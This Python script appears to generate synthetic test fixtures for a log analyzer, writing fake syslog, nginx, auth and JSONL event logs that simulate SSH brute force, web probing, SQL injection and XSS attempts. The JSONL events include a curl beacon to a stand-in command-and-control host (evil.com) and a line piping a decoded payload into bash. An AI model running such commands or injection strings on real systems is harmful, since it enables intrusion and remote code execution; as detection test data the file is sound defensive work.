#!/usr/bin/env python3
"""Generate deterministic test fixtures for D3 Log Analyzer."""
import os

FIXTURE_DIR = os.path.join(os.path.dirname(__file__), "fixtures")


def gen_syslog():
    lines = [
        "Jan  5 08:00:01 webhost1 sshd[1234]: Accepted password for analyst from 198.51.100.22 port 44221 ssh2",
        "Jan  5 08:00:02 webhost1 sshd[1234]: pam_unix(sshd:session): session opened for user analyst",
        "Jan  5 08:01:10 webhost1 sshd[2345]: Failed password for root from 203.0.113.50 port 51200 ssh2",
        "Jan  5 08:01:11 webhost1 sshd[2346]: Failed password for root from 203.0.113.50 port 51201 ssh2",
        "Jan  5 08:01:12 webhost1 sshd[2347]: Failed password for root from 203.0.113.50 port 51202 ssh2",
        "Jan  5 08:01:13 webhost1 sshd[2348]: Failed password for root from 203.0.113.50 port 51203 ssh2",
        "Jan  5 08:01:14 webhost1 sshd[2349]: Failed password for root from 203.0.113.50 port 51204 ssh2",
        "Jan  5 08:01:15 webhost1 sshd[2350]: Failed password for root from 203.0.113.50 port 51205 ssh2",
        "Jan  5 08:02:00 webhost1 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.50 DST=198.51.100.10 PROTO=TCP DPT=22",
        "Jan  5 09:15:00 webhost1 CRON[3456]: (root) CMD (/usr/local/bin/backup.sh)",
        "Jan  5 10:30:00 webhost1 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update",
        "Jan  5 11:00:00 webhost1 systemd[1]: Started Apache HTTP Server.",
        "Jan  5 12:00:00 webhost1 kernel: [UFW BLOCK] IN=eth0 SRC=192.0.2.99 DST=198.51.100.10 PROTO=UDP DPT=53",
        "Jan  5 14:30:00 webhost1 sshd[4567]: Accepted publickey for admin from 198.51.100.22 port 60000 ssh2",
        "Jan  5 15:00:00 webhost1 kernel: TCP: Possible SYN flooding on port 80. Sending cookies.",
    ]
    return "\n".join(lines) + "\n"


def gen_nginx_access():
    lines = [
        '198.51.100.22 - - [05/Jan/2024:08:00:00 +0000] "GET /index.html HTTP/1.1" 200 3421 "-" "Mozilla/5.0"',
        '198.51.100.22 - - [05/Jan/2024:08:00:05 +0000] "GET /style.css HTTP/1.1" 200 1234 "-" "Mozilla/5.0"',
        '198.51.100.22 - - [05/Jan/2024:08:00:10 +0000] "GET /api/users HTTP/1.1" 200 512 "-" "Mozilla/5.0"',
        '203.0.113.50 - - [05/Jan/2024:08:01:00 +0000] "GET /admin HTTP/1.1" 403 256 "-" "curl/7.68"',
        '203.0.113.50 - - [05/Jan/2024:08:01:01 +0000] "GET /wp-admin HTTP/1.1" 404 180 "-" "curl/7.68"',
        '203.0.113.50 - - [05/Jan/2024:08:01:02 +0000] "GET /phpmyadmin HTTP/1.1" 404 180 "-" "curl/7.68"',
        '203.0.113.50 - - [05/Jan/2024:08:01:03 +0000] "GET /cgi-bin/test HTTP/1.1" 404 180 "-" "curl/7.68"',
        '203.0.113.50 - - [05/Jan/2024:08:01:04 +0000] "GET /etc/passwd HTTP/1.1" 403 256 "-" "curl/7.68"',
        '203.0.113.50 - - [05/Jan/2024:08:01:05 +0000] "GET /shell.php HTTP/1.1" 404 180 "-" "curl/7.68"',
        '203.0.113.50 - - [05/Jan/2024:08:01:06 +0000] "POST /login HTTP/1.1" 200 1024 "-" "curl/7.68"',
        '10.0.0.55 - - [05/Jan/2024:09:00:00 +0000] "GET /search?q=select+username+from+users HTTP/1.1" 200 4096 "-" "Mozilla/5.0"',
        '10.0.0.55 - - [05/Jan/2024:09:00:05 +0000] "GET /page?id=1+OR+1=1 HTTP/1.1" 200 4096 "-" "Mozilla/5.0"',
        '10.0.0.55 - - [05/Jan/2024:09:00:10 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 4096 "-" "Mozilla/5.0"',
        '198.51.100.22 - - [05/Jan/2024:10:00:00 +0000] "GET /api/data HTTP/1.1" 200 8192 "-" "Mozilla/5.0"',
        '198.51.100.22 - - [05/Jan/2024:10:00:05 +0000] "POST /api/upload HTTP/1.1" 201 0 "-" "Mozilla/5.0"',
    ]
    return "\n".join(lines) + "\n"


def gen_auth_log():
    lines = [
        "Jan  5 08:00:01 webhost1 sshd[1234]: Accepted password for analyst from 198.51.100.22 port 44221 ssh2",
        "Jan  5 08:00:02 webhost1 sshd[1234]: pam_unix(sshd:session): session opened for user analyst",
        "Jan  5 08:01:10 webhost1 sshd[2345]: Failed password for root from 203.0.113.50 port 51200 ssh2",
        "Jan  5 08:01:11 webhost1 sshd[2346]: Failed password for root from 203.0.113.50 port 51201 ssh2",
        "Jan  5 08:01:12 webhost1 sshd[2347]: Failed password for root from 203.0.113.50 port 51202 ssh2",
        "Jan  5 08:01:13 webhost1 sshd[2348]: Failed password for root from 203.0.113.50 port 51203 ssh2",
        "Jan  5 08:01:14 webhost1 sshd[2349]: Failed password for root from 203.0.113.50 port 51204 ssh2",
        "Jan  5 08:01:15 webhost1 sshd[2350]: Failed password for root from 203.0.113.50 port 51205 ssh2",
        "Jan  5 08:01:16 webhost1 sshd[2351]: Failed password for admin from 203.0.113.50 port 51206 ssh2",
        "Jan  5 08:01:17 webhost1 sshd[2352]: Failed password for admin from 203.0.113.50 port 51207 ssh2",
        "Jan  5 08:01:18 webhost1 sshd[2353]: Failed password for admin from 203.0.113.50 port 51208 ssh2",
        "Jan  5 08:01:19 webhost1 sshd[2354]: Failed password for admin from 203.0.113.50 port 51209 ssh2",
        "Jan  5 08:01:20 webhost1 sshd[2355]: Failed password for admin from 203.0.113.50 port 51210 ssh2",
        "Jan  5 08:01:21 webhost1 sshd[2356]: Failed password for administrator from 203.0.113.50 port 51211 ssh2",
        "Jan  5 08:01:22 webhost1 sshd[2357]: Failed password for administrator from 203.0.113.50 port 51212 ssh2",
        "Jan  5 08:01:23 webhost1 sshd[2358]: Failed password for root from 203.0.113.50 port 51213 ssh2",
        "Jan  5 08:01:24 webhost1 sshd[2359]: Failed password for root from 203.0.113.50 port 51214 ssh2",
        "Jan  5 08:01:25 webhost1 sshd[2360]: Failed password for root from 203.0.113.50 port 51215 ssh2",
        "Jan  5 09:00:00 webhost1 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/apt update",
        "Jan  5 14:30:00 webhost1 sshd[4567]: Accepted publickey for admin from 198.51.100.22 port 60000 ssh2",
    ]
    return "\n".join(lines) + "\n"


def gen_jsonl_events():
    lines = [
        '{"timestamp":"2024-01-05T08:00:00Z","source":"firewall","type":"blocked","src_ip":"192.0.2.99","dst_ip":"198.51.100.10","port":80,"proto":"TCP"}',
        '{"timestamp":"2024-01-05T08:01:00Z","source":"ids","type":"alert","src_ip":"203.0.113.50","dst_ip":"198.51.100.10","port":22,"proto":"TCP","signature":"SSH-brute-force"}',
        '{"timestamp":"2024-01-05T08:05:00Z","source":"firewall","type":"blocked","src_ip":"203.0.113.50","dst_ip":"198.51.100.10","port":22,"proto":"TCP"}',
        '{"timestamp":"2024-01-05T09:00:00Z","source":"webapp","type":"request","src_ip":"10.0.0.55","path":"/search?q=union+select","status":200}',
        '{"timestamp":"2024-01-05T09:00:05Z","source":"webapp","type":"request","src_ip":"10.0.0.55","path":"/page?id=1%20OR%201=1","status":200}',
        '{"timestamp":"2024-01-05T10:00:00Z","source":"system","type":"process","user":"root","command":"/usr/bin/curl http://malware-cnc.evil.com/beacon"}',
        '{"timestamp":"2024-01-05T12:00:00Z","source":"system","type":"process","user":"root","command":"base64 -d /tmp/payload.bin | bash"}',
        '{"timestamp":"2024-01-05T14:00:00Z","source":"firewall","type":"allowed","src_ip":"198.51.100.22","dst_ip":"198.51.100.10","port":443,"proto":"TCP"}',
    ]
    return "\n".join(lines) + "\n"


def main():
    os.makedirs(FIXTURE_DIR, exist_ok=True)
    with open(os.path.join(FIXTURE_DIR, "syslog.txt"), "w") as f:
        f.write(gen_syslog())
    with open(os.path.join(FIXTURE_DIR, "nginx_access.log"), "w") as f:
        f.write(gen_nginx_access())
    with open(os.path.join(FIXTURE_DIR, "auth.log"), "w") as f:
        f.write(gen_auth_log())
    with open(os.path.join(FIXTURE_DIR, "events.jsonl"), "w") as f:
        f.write(gen_jsonl_events())
    print("Fixtures written to %s" % FIXTURE_DIR)


if __name__ == "__main__":
    main()
